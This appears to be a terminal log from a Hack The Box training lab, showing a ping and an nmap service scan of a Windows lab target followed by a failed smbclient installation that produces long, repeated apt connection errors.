@@ -1,0 +1,285 @@
+┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ ping 10.129.1.12
+PING 10.129.1.12 (10.129.1.12) 56(84) bytes of data.
+64 bytes from 10.129.1.12: icmp_seq=1 ttl=127 time=66.4 ms
+64 bytes from 10.129.1.12: icmp_seq=2 ttl=127 time=66.5 ms
+64 bytes from 10.129.1.12: icmp_seq=3 ttl=127 time=70.5 ms
+64 bytes from 10.129.1.12: icmp_seq=4 ttl=127 time=66.2 ms
+64 bytes from 10.129.1.12: icmp_seq=5 ttl=127 time=66.3 ms
+64 bytes from 10.129.1.12: icmp_seq=6 ttl=127 time=168 ms
+^C
+--- 10.129.1.12 ping statistics ---
+6 packets transmitted, 6 received, 0% packet loss, time 5006ms
+rtt min/avg/max/mdev = 66.194/84.043/168.445/37.775 ms
+
+┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ sudo nmap -sV 10.129.1.12
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-21 04:35 EDT
+Nmap scan report for 10.129.1.12
+Host is up (0.068s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
+
+┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ sudo apt-get install smbclient
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following package was automatically installed and is no longer required:
+  linux-image-6.12.73+deb13-amd64
+Use 'sudo apt autoremove' to remove it.
+The following additional packages will be installed:
+  libldb2 libnss-winbind libpam-winbind libsmbclient0 libtalloc2 libtdb1
+  libtevent0t64 libwbclient0 python3-ldb python3-samba python3-talloc
+  python3-tdb samba samba-ad-dc samba-ad-provision samba-common
+  samba-common-bin samba-dsdb-modules samba-libs samba-vfs-modules tdb-tools
+  winbind
+The following packages will be upgraded:
+  libldb2 libnss-winbind libpam-winbind libsmbclient0 libtalloc2 libtdb1
+  libtevent0t64 libwbclient0 python3-ldb python3-samba python3-talloc
+  python3-tdb samba samba-ad-dc samba-ad-provision samba-common
+  samba-common-bin samba-dsdb-modules samba-libs samba-vfs-modules smbclient
+  tdb-tools winbind
+23 upgraded, 0 newly installed, 0 to remove and 466 not upgraded.
+Need to get 14.6 MB of archives.
+After this operation, 39.9 kB of additional disk space will be used.
+Do you want to continue? [Y/n] y
+Ign:1 https://deb.parrot.sh/parrot echo/main amd64 libtalloc2 amd64 2:2.4.3+samba4.22.10+dfsg-0+deb13u1
+Ign:2 https://deb.parrot.sh/parrot echo/main amd64 libtevent0t64 amd64 2:0.16.2+samba4.22.10+dfsg-0+deb13u1
+Ign:3 https://deb.parrot.sh/parrot echo/main amd64 libsmbclient0 amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:4 https://deb.parrot.sh/parrot echo/main amd64 smbclient amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:5 https://deb.parrot.sh/parrot echo/main amd64 samba-dsdb-modules amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:6 https://deb.parrot.sh/parrot echo/main amd64 python3-samba amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:7 https://deb.parrot.sh/parrot echo/main amd64 samba-common-bin amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:8 https://deb.parrot.sh/parrot echo/main amd64 python3-ldb amd64 2:2.11.0+samba4.22.10+dfsg-0+deb13u1
+Ign:9 https://deb.parrot.sh/parrot echo/main amd64 libldb2 amd64 2:2.11.0+samba4.22.10+dfsg-0+deb13u1
+Ign:10 https://deb.parrot.sh/parrot echo/main amd64 samba-libs amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:11 https://deb.parrot.sh/parrot echo/main amd64 samba-ad-provision all 2:4.22.10+dfsg-0+deb13u1
+Ign:11 https://deb.parrot.sh/parrot echo/main amd64 samba-ad-provision all 2:4.22.10+dfsg-0+deb13u1
+Ign:10 https://deb.parrot.sh/parrot echo/main amd64 samba-libs amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:9 https://deb.parrot.sh/parrot echo/main amd64 libldb2 amd64 2:2.11.0+samba4.22.10+dfsg-0+deb13u1
+Ign:8 https://deb.parrot.sh/parrot echo/main amd64 python3-ldb amd64 2:2.11.0+samba4.22.10+dfsg-0+deb13u1
+Ign:7 https://deb.parrot.sh/parrot echo/main amd64 samba-common-bin amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:6 https://deb.parrot.sh/parrot echo/main amd64 python3-samba amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:5 https://deb.parrot.sh/parrot echo/main amd64 samba-dsdb-modules amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:4 https://deb.parrot.sh/parrot echo/main amd64 smbclient amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:3 https://deb.parrot.sh/parrot echo/main amd64 libsmbclient0 amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:2 https://deb.parrot.sh/parrot echo/main amd64 libtevent0t64 amd64 2:0.16.2+samba4.22.10+dfsg-0+deb13u1
+Ign:1 https://deb.parrot.sh/parrot echo/main amd64 libtalloc2 amd64 2:2.4.3+samba4.22.10+dfsg-0+deb13u1
+Ign:1 https://deb.parrot.sh/parrot echo/main amd64 libtalloc2 amd64 2:2.4.3+samba4.22.10+dfsg-0+deb13u1
+Ign:2 https://deb.parrot.sh/parrot echo/main amd64 libtevent0t64 amd64 2:0.16.2+samba4.22.10+dfsg-0+deb13u1
+Ign:3 https://deb.parrot.sh/parrot echo/main amd64 libsmbclient0 amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:4 https://deb.parrot.sh/parrot echo/main amd64 smbclient amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:5 https://deb.parrot.sh/parrot echo/main amd64 samba-dsdb-modules amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:6 https://deb.parrot.sh/parrot echo/main amd64 python3-samba amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:7 https://deb.parrot.sh/parrot echo/main amd64 samba-common-bin amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:8 https://deb.parrot.sh/parrot echo/main amd64 python3-ldb amd64 2:2.11.0+samba4.22.10+dfsg-0+deb13u1
+Ign:9 https://deb.parrot.sh/parrot echo/main amd64 libldb2 amd64 2:2.11.0+samba4.22.10+dfsg-0+deb13u1
+Ign:10 https://deb.parrot.sh/parrot echo/main amd64 samba-libs amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:11 https://deb.parrot.sh/parrot echo/main amd64 samba-ad-provision all 2:4.22.10+dfsg-0+deb13u1
+Err:11 https://deb.parrot.sh/parrot echo/main amd64 samba-ad-provision all 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:10 https://deb.parrot.sh/parrot echo/main amd64 samba-libs amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:9 https://deb.parrot.sh/parrot echo/main amd64 libldb2 amd64 2:2.11.0+samba4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:8 https://deb.parrot.sh/parrot echo/main amd64 python3-ldb amd64 2:2.11.0+samba4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:7 https://deb.parrot.sh/parrot echo/main amd64 samba-common-bin amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:6 https://deb.parrot.sh/parrot echo/main amd64 python3-samba amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:5 https://deb.parrot.sh/parrot echo/main amd64 samba-dsdb-modules amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:4 https://deb.parrot.sh/parrot echo/main amd64 smbclient amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:3 https://deb.parrot.sh/parrot echo/main amd64 libsmbclient0 amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:2 https://deb.parrot.sh/parrot echo/main amd64 libtevent0t64 amd64 2:0.16.2+samba4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:1 https://deb.parrot.sh/parrot echo/main amd64 libtalloc2 amd64 2:2.4.3+samba4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable) Could not connect to deb.parrot.sh:443 (23.19.10.59), connection timed out Could not connect to deb.parrot.sh:443 (23.19.10.58), connection timed out
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Ign:12 https://deb.parrot.sh/parrot echo/main amd64 samba amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:13 https://deb.parrot.sh/parrot echo/main amd64 samba-ad-dc amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:14 https://deb.parrot.sh/parrot echo/main amd64 libpam-winbind amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:15 https://deb.parrot.sh/parrot echo/main amd64 winbind amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:16 https://deb.parrot.sh/parrot echo/main amd64 libnss-winbind amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:17 https://deb.parrot.sh/parrot echo/main amd64 samba-common all 2:4.22.10+dfsg-0+deb13u1
+Ign:18 https://deb.parrot.sh/parrot echo/main amd64 libtdb1 amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+Ign:19 https://deb.parrot.sh/parrot echo/main amd64 libwbclient0 amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:20 https://deb.parrot.sh/parrot echo/main amd64 python3-tdb amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+Ign:21 https://deb.parrot.sh/parrot echo/main amd64 python3-talloc amd64 2:2.4.3+samba4.22.10+dfsg-0+deb13u1
+Ign:22 https://deb.parrot.sh/parrot echo/main amd64 samba-vfs-modules amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:22 https://deb.parrot.sh/parrot echo/main amd64 samba-vfs-modules amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:21 https://deb.parrot.sh/parrot echo/main amd64 python3-talloc amd64 2:2.4.3+samba4.22.10+dfsg-0+deb13u1
+Ign:20 https://deb.parrot.sh/parrot echo/main amd64 python3-tdb amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+Ign:19 https://deb.parrot.sh/parrot echo/main amd64 libwbclient0 amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:18 https://deb.parrot.sh/parrot echo/main amd64 libtdb1 amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+Ign:17 https://deb.parrot.sh/parrot echo/main amd64 samba-common all 2:4.22.10+dfsg-0+deb13u1
+Ign:16 https://deb.parrot.sh/parrot echo/main amd64 libnss-winbind amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:15 https://deb.parrot.sh/parrot echo/main amd64 winbind amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:14 https://deb.parrot.sh/parrot echo/main amd64 libpam-winbind amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:13 https://deb.parrot.sh/parrot echo/main amd64 samba-ad-dc amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:12 https://deb.parrot.sh/parrot echo/main amd64 samba amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:12 https://deb.parrot.sh/parrot echo/main amd64 samba amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:13 https://deb.parrot.sh/parrot echo/main amd64 samba-ad-dc amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:14 https://deb.parrot.sh/parrot echo/main amd64 libpam-winbind amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:15 https://deb.parrot.sh/parrot echo/main amd64 winbind amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:16 https://deb.parrot.sh/parrot echo/main amd64 libnss-winbind amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:17 https://deb.parrot.sh/parrot echo/main amd64 samba-common all 2:4.22.10+dfsg-0+deb13u1
+Ign:18 https://deb.parrot.sh/parrot echo/main amd64 libtdb1 amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+Ign:19 https://deb.parrot.sh/parrot echo/main amd64 libwbclient0 amd64 2:4.22.10+dfsg-0+deb13u1
+Ign:20 https://deb.parrot.sh/parrot echo/main amd64 python3-tdb amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+Ign:21 https://deb.parrot.sh/parrot echo/main amd64 python3-talloc amd64 2:2.4.3+samba4.22.10+dfsg-0+deb13u1
+Ign:22 https://deb.parrot.sh/parrot echo/main amd64 samba-vfs-modules amd64 2:4.22.10+dfsg-0+deb13u1
+Err:22 https://deb.parrot.sh/parrot echo/main amd64 samba-vfs-modules amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:21 https://deb.parrot.sh/parrot echo/main amd64 python3-talloc amd64 2:2.4.3+samba4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:20 https://deb.parrot.sh/parrot echo/main amd64 python3-tdb amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:19 https://deb.parrot.sh/parrot echo/main amd64 libwbclient0 amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:18 https://deb.parrot.sh/parrot echo/main amd64 libtdb1 amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:17 https://deb.parrot.sh/parrot echo/main amd64 samba-common all 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:16 https://deb.parrot.sh/parrot echo/main amd64 libnss-winbind amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:15 https://deb.parrot.sh/parrot echo/main amd64 winbind amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:14 https://deb.parrot.sh/parrot echo/main amd64 libpam-winbind amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:13 https://deb.parrot.sh/parrot echo/main amd64 samba-ad-dc amd64 2:4.22.10+dfsg-0+deb13u1
